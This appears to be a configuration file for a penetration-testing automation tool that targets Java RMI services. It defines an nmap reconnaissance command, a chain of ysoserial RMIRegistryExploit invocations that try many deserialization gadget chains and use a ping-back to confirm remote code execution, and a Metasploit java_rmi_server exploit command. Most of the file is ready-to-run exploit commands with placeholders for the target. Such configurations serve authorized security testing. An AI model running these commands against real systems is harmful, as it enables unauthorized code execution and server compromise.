[general]
tools_categories = fingerprinting, deserialize, class_loading


[usemulti_nmap_rmi_recon]
name = nmap_rmi_recon_script
tool_ref_name = nmap
category = fingerprinting
description = Nmap RMI scripts for reconnaissance
command = nmap -sV -Pn -vv -p [PORT] --script='rmi-*' -oN [OUTPUT] [IP]

[usemulti_ysoserial_rmiregistry]
name = ysoserial_rmiregistry
tool_ref_name = ysoserial
category = deserialize
description = Check for Java deserialize vulnerability. !! IMPORTANT !!: Run "sudo tcpdump icmp" in parallel to check if command is executed by the server
command = java -jar ysoserial-master-SNAPSHOT.jar; LOCAL_IP=`ip -4 addr show eth0 | grep -oP "(?<=inet ).*(?=/)"`; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsBeanutils1 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections1  "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections2 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections3 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections4 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections5 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections6 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Groovy1 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Hibernate1 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Hibernate2 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JBossInterceptors1 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JSON1 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JavassistWeld1 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Jdk7u21 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Spring1 "/bin/ping -c 4 $LOCAL_IP"; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Spring2 "/bin/ping -c 4 $LOCAL_IP"; 


[usemulti_msf_java_rmi_server]
name = MSF_java_rmi_server
tool_ref_name = metasploit
category = class_loading
description = Metasploit module - exploit/multi/misc/java_rmi_server - Takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL.
command = sudo msfconsole -x "use exploit/multi/misc/java_rmi_server; set RHOST [HOST]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; exploit; exit"